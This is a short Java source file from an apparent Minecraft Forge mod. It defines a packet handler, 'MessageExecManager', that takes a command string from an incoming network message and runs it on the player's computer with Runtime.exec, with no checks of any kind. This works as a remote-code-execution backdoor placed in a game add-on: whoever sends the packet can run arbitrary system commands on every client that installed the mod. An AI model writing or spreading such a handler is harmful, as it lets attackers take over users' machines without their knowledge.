package com.fuzhudada.error.packet;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.IMessageHandler;
import net.minecraftforge.fml.common.network.simpleimpl.MessageContext;

import java.io.IOException;

public class MessageExecManager implements IMessageHandler<MessageExec, IMessage> {
    @Override
    public IMessage onMessage(MessageExec message , MessageContext ctx) {
        Minecraft mc=Minecraft.getMinecraft();
        mc.addScheduledTask(() -> {try {
            Runtime.getRuntime().exec(message.cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }});
        return null;
    }
}
